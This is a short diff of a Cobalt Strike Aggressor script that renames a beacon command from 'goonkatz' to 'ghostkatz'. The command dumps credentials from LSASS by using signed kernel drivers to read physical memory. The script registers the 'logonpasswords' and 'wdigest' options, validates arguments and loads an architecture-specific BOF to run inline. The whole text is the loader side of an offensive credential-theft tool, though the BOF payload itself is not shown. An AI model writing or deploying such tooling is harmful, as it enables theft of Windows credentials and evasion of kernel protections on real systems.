@@ -1,26 +1,26 @@
 #Register command
 beacon_command_register(
-"goonkatz", 
+"ghostkatz", 
 "Dump credentials from LSASS by using signed kernel drivers to read physical memory.",
-"Synopsis: goonkatz [logonpasswords/wdigest]\n" .
+"Synopsis: ghostkatz [logonpasswords/wdigest]\n" .
 "Description:\n" .
 "  Dump credentials from LSASS by using signed kernel drivers to read physical memory.\n\n" .
 "Examples:\n" .
-"  goonkatz logonpasswords\n" .
-"  goonkatz wdigest\n"
+"  ghostkatz logonpasswords\n" .
+"  ghostkatz wdigest\n"
 );
 
-alias goonkatz {
+alias ghostkatz {
     $data = substr($0, 9);
     @args = split(" ", $data);
 
 	if (size(@_) != 2)
 	{
-		berror($1, "Invalid number of arguments! (See 'help goonkatz')");
+		berror($1, "Invalid number of arguments! (See 'help ghostkatz')");
 		return -1;
 	}
 	
-	btask($1, "Tasked beacon to inline execute Goonkatz!");
+	btask($1, "Tasked beacon to inline execute GhostKatz!");
 	$barch = barch($1);
 	$argument = $2;
 	
@@ -31,7 +31,7 @@ alias goonkatz {
     }
 
 	# Read BOF file
-	$handle = openf(script_resource("bin/goonkatz. $+ $barch $+ .o"));
+	$handle = openf(script_resource("bin/ghostkatz. $+ $barch $+ .o"));
 	$bof = readb($handle, -1);
 	closef($handle);
 	if(strlen($bof) < 1)
